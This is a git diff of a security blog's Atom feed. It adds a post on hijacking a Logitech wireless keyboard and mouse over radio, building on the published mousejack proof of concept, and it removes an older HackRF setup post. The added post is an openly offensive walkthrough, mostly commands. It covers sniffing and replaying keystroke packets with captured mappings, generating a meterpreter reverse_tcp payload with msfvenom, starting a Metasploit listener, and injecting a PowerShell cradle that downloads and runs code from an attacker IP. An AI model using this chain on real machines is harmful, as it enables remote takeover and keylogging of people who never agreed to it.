@@ -4,7 +4,7 @@
   <title><![CDATA[Category: radio | The poetry of (in)security]]></title>
   <link href="http://www.ckn.io/blog/categories/radio/atom.xml" rel="self"/>
   <link href="http://www.ckn.io/"/>
-  <updated>2016-06-26T15:09:22+03:00</updated>
+  <updated>2016-07-10T13:04:20+03:00</updated>
   <id>http://www.ckn.io/</id>
   <author>
     <name><![CDATA[ck]]></name>
@@ -12,6 +12,94 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Hijacking wireless mice and keyboards]]></title>
+    <link href="http://www.ckn.io/blog/2016/07/09/hijacking-wireless-mice-and-keyboards/"/>
+    <updated>2016-07-09T14:40:38+03:00</updated>
+    <id>http://www.ckn.io/blog/2016/07/09/hijacking-wireless-mice-and-keyboards</id>
+    <content type="html"><![CDATA[<p>Earlier this year researchers from <a href="https://www.bastille.net/" target="_blank"><strong>Bastille</strong></a> discovered vulnerabilities in wireless mice and keyboards that could lead to them being remotely hijacked from as far as 225 meters away. They have a dedicated site detailing the vulnerabilities dubbed <a href="https://www.mousejack.com/" target="_blank"><strong>mousejack</strong></a>. They also released POC code which I have built on to implement a remote takeover of a machine using a wireless mouse/keyboard.</p>
+
+<!--more-->
+
+
+<p>I already had in my possesion the Logitech Wireless Combo MK220 which consists of a K220 wireless keyboard and an M150 wireless mouse which I used as my test devices.</p>
+
+<p><img src="/images/mk220.jpg"></p>
+
+<p>I used the <a href="https://www.bitcraze.io/crazyradio-pa/" target="_blank"><strong>Crazyradio PA long range open USB radio dongle</strong></a> as the attack device.
+The original mousejack POC code is available on <a href=" https://github.com/RFStorm/mousejack" target="_blank"><strong>Github</strong></a> with instructions on how to flash the firmware necessary to perform the attack. I therefore set up both my machine and the Crazyradio PA dongle as described in their POC and tested the functionality they had provided.</p>
+
+<p><img src="/images/CrazyRadioSide.jpg"></p>
+
+<p>I was then able to scan and sniff the packets transmitted by the mouse/keyboard using the <strong>nrf24-scanner.py</strong> and the <strong>nrf24-sniffer.py</strong> scripts. However, I was more interested in hijacking the mouse/keyboard and controlling the machine remotely. I therefore extended the POC to serve my purposes.</p>
+
+<p>First, I modified the <strong>nrf24-sniffer.py</strong> code to log the sniiffed packets to a user specified output file.</p>
+
+<h3>Sniff packets from address 8C:D3:0F:3E:B4 on all channels and save them to output.log</h3>
+
+<p><code>./nrf24-sniffer.py --lna -a 8C:D3:0F:3E:B4 -o output.log</code></p>
+
+<p>Next, I wrote a new python script <strong>nrf24-replay.py</strong> that would transmit packets read from a log file.
+This would replay captured packets or transmit generated ones and follow the wireless USB dongle as it hopped through the channels.</p>
+
+<h3>Send packets from the file keystroke.log to address 8C:D3:0F:3E:B4 on a hopping channel</h3>
+
+<p><code>./nrf24-replay.py --lna -a 8C:D3:0F:3E:B4 -v -t 10 -i keystroke.log</code></p>
+
+<p>With this in place I could now begin the hijack phase.
+The first thing was to capture and study different key presses and interesting key combinations. From there I created mappings of the key presses to their corresponding packets. A sample of the digit mappings looks like this:</p>
+
+<p><code>1  B4:D3:68:62:72:7D:CC:4B:C4:DD:F5:DE:EB:F3:00:00:00:00:00:00:00:57</code><br/>
+<code>2  00:D3:C1:1E:FE:28:B4:AB:8B:34:F5:DE:EB:F5:00:00:00:00:00:00:00:57</code><br/>
+<code>3  00:D3:8B:94:36:32:63:B0:7D:82:F5:DE:EB:F7:00:00:00:00:00:00:00:DF</code><br/>
+<code>4  00:D3:F6:E7:3C:36:52:67:28:1E:F5:DE:EB:F9:00:00:00:00:00:00:00:28</code><br/>
+<code>5  00:D3:46:06:1E:DB:58:93:57:03:F5:DE:EB:FB:00:00:00:00:00:00:00:EA</code><br/>
+<code>6  00:D3:BC:9B:18:BA:EE:93:6D:3C:F5:DE:EB:FD:00:00:00:00:00:00:00:1F</code><br/>
+<code>7  00:D3:47:7D:FC:44:55:5E:E4:78:F5:DE:EB:FF:00:00:00:00:00:00:00:5D</code><br/>
+<code>8  00:D3:BE:11:A7:CC:9D:75:7A:A5:F5:DE:EC:01:00:00:00:00:00:00:00:FA</code><br/>
+<code>9  00:D3:A1:E6:E7:E1:DC:6C:70:31:F5:DE:EC:03:00:00:00:00:00:00:00:33</code><br/>
+<code>0  00:D3:C5:01:FC:0A:F0:6C:B7:6D:F5:DE:EC:05:00:00:00:00:00:00:00:1D</code></p>
+
+<p>I also did the same for useful key combinations such as ALT-F2, ALT-F4 and so on.<br/>
+I then wrote a python script called <strong>keymapper.py</strong> that would create a log file of packets of the corresponding key presses.</p>
+
+<p>Now I could generate packets and save them to a log file and then wirelessly hijack the mouse/keyboard and perform various operations on the target machine.</p>
+
+<p>Powershell is becoming one of the mot effective avenues of attacking a Windows machine. I therefore used the following aproach to accomplish the full hijack of a target machine:</p>
+
+<ul>
+<li><p>Generate and host a powershell payload on the attack server<br/>
+<code>msfvenom -p windows/meterpreter/reverse_tcp lhost=ip lport=port -f psh-cmd -o update.ps1</code></p></li>
+<li><p>Start a metasploit listener on our attack server<br/>
+<code>msfconsole</code><br/>
+<code>use exploit/multi/handler</code><br/>
+<code>set LHOST IP</code><br/>
+<code>set LPORT PORT</code><br/>
+<code>set PAYLOAD windows/meterpreter/reverse_tcp</code><br/>
+<code>exploit -j</code></p></li>
+<li><p>Translate our powershell one liner to the corresponding packets using the keymapper.py script<br/>
+<code>
+./keymapper.py
+powershell "iex (new-object net.webclient).downloadstring('http://IP/update.ps1')"
+</code></p></li>
+<li><p>Hijack the target&rsquo;s wireless mouse/keyboard and wait for their machine to connect back to the attack server
+<code>./nrf24-replay.py --lna -a 8C:D3:0F:3E:B4 -i shell.log -t 10</code></p></li>
+<li><p>Perform post exploitation on the target machine</p></li>
+</ul>
+
+
+<p>I have uploaded the POC code <a href="https://github.com/iamckn/mousejack_transmit" target="_blank"><strong>here</strong></a> on Github.</p>
+
+<p>A POC video of the hijack described can be found below where I take over a Windows 7 machine and perform keylogging post-exploitation.</p>
+
+<p><a href="http://www.youtube.com/watch?v=YLzUeK1IvJs"><img src="http://img.youtube.com/vi/YLzUeK1IvJs/0.jpg" alt="IMAGE ALT TEXT HERE" /></a></p>
+
+<p>Further research on different wireless mice/keyboards is ongoing more so on the packet composition and encryption.</p>
+
+<p>Till next time, happy hacking!</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[A DIY Listening Device]]></title>
@@ -417,94 +505,6 @@ Here is a sample showing BTS Location details.</p>
 In subsequent posts I&rsquo;ll explain and show how to interpret the decoded traffic as I explain how GSM communication takes place.
 From there I&rsquo;ll demonstrate how to decrypt the traffic. That is where it gets really interesting as we start reading SMS&rsquo;s, listening to calls and so on :).
 Till then, happy hacking.</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[The HackRF One: First steps]]></title>
-    <link href="http://www.ckn.io/blog/2015/10/11/the-hackrf-one-first-steps/"/>
-    <updated>2015-10-11T20:18:10+03:00</updated>
-    <id>http://www.ckn.io/blog/2015/10/11/the-hackrf-one-first-steps</id>
-    <content type="html"><![CDATA[<p>The wireless world is an area I&rsquo;ve been interested in for a long time. From the the more common applications such as Wi-Fi, bluetooth and FM to the lesser explored such as radar, satellite and GSM, radio frequency is an area I plan to explore extensively. How awesome is the concept of <a href="https://en.wikipedia.org/wiki/Electromagnetic_pulse" target="_blank"><strong>electromagnetic pulses</strong></a> in this age that is driven by electromagnetism. I digress so let me get back on track, there will be several more posts to explore the possibilities.</p>
-
-<!--more-->
-
-
-<p>I recently acquired the awesome <a href="https://greatscottgadgets.com/hackrf/" target="_blank"><strong>HackRF One</strong></a>, a Software Defined Radio peripheral capable of transmission or reception of radio signals from 1 MHz to 6 GHz. I added the <a href="http://www.nooelec.com/store/ham-it-up.html" target="_blank"><strong>Ham It Up v1.3 - RF Upconverter</strong></a> to boost performance in the lower frequency ranges. A telescopic antenna and various connectors complete the setup.</p>
-
-<h2>The Hardware</h2>
-
-<p><strong>The HackRF One, telescopic antenna (ANT 500), some connectors and a Ham It Up v1.3 - RF Upconverter</strong>
-<img src="/images/hackrf_hardware.JPG"></p>
-
-<h2>Software setup</h2>
-
-<p>I did my setup on archlinux but it should be just as easy on other OS&rsquo;s. Here are the instructions from the <a href="https://github.com/mossmann/hackrf/wiki/Operating-System-Tips" target="_blank"><strong>HackRF Github wiki page</strong></a>.
-On my system I followed the following steps:</p>
-
-<h3><strong><em>Installation of various software</em></strong></h3>
-
-<pre><code class="bash">sudo pacman -S hackrf gnuradio-osmosdr gnuradio gnuradio-companion gqrx
-yaourt -S gr-fosphor-git
-</code></pre>
-
-<h3><strong><em>Creation of udev rules to allow access to the HackRF</em></strong></h3>
-
-<pre><code class="bash">sudo nano /etc/udev/rules.d/52-hackrf.rules
-    ATTR{idVendor}=="1d50", ATTR{idProduct}=="6089", SYMLINK+="hackrf-one-%k", MODE="660", TAG+="uaccess"
-    ATTR{idVendor}=="1fc9", ATTR{idProduct}=="000c", SYMLINK+="hackrf-dfu-%k", MODE="660", TAG+="uaccess"
-</code></pre>
-
-<h3><strong><em>Testing the HackRF</em></strong></h3>
-
-<p>Plug in the HackRF and run
-<code>bash
-hackrf_info
-</code>
-You should get output similar to:
-<code>bash
-Found HackRF board 0:
-USB descriptor string: 000000000000000014d463dc2f45a7e1
-Board ID Number: 2 (HackRF One)
-Firmware Version: 2015.07.2
-Part ID Number: 0xa000cb3c 0x0069435b
-Serial Number: 0x00000000 0x00000000 0x14d463dc 0x2f45a7e1
-</code>
-If you get an error, recheck your udev rules and ensure the HackRF USB connection is ok.</p>
-
-<h3><strong><em>Updating the SPI Flash Firmware</em></strong></h3>
-
-<p>Download the latest firmware <a href="https://github.com/mossmann/hackrf/releases/tag/v2015.07.2" target="_blank"><strong>here</strong></a>.
-<code>bash
-wget https://github.com/mossmann/hackrf/releases/download/v2015.07.2/hackrf-2015.07.2.zip
-unzip hackrf-2015.07.2.zip
-cd hackrf-2015.07.2/firmware-bin/
-hackrf_spiflash -w hackrf_one_usb_rom_to_ram.bin
-</code></p>
-
-<h3><strong><em>Updating the CPLD</em></strong></h3>
-
-<pre><code class="bash">cd ..
-hackrf_cpldjtag -x firmware/cpld/sgpio_if/default.xsvf
-</code></pre>
-
-<p>Press the reset button, then run the <strong>hackrf_info</strong> command and confirm the firmware updated successfully.
-We are then ready to try the &ldquo;Hello World&rdquo; of Software Defined Radio, implementing an FM receiver.</p>
-
-<h2>An FM Receiver</h2>
-
-<p>We will use the gnuradio-companion for this.
-Download and save this <a href="https://raw.githubusercontent.com/rrobotics/hackrf-tests/master/fm_radio/fm_radio_rx.grc" target="_blank"><strong>file</strong></a>, then open it using gnuradio from the terminal.
-<code>bash
-gnuradio-companion fm_radio_rx.grc
-</code>
-You can then tune in to your preferred radio frequency and listen in.
-<img src="/images/fm_receiver.png"></p>
-
-<p>With that out of the way, you can try building the FM receiver yourself using the gnuradio-companion.
-With the HackRF&rsquo;s transmission capability, an FM transmitter can also be implemented. I won&rsquo;t say I haven&rsquo;t thought of jamming certain frequencies in the vicinity, but that would be illegal, wouldn&rsquo;t it :)?
-In the next post, I&rsquo;ll show how to sniff gsm traffic.
-Till then, happy hacking :).</p>
 ]]></content>
   </entry>
   
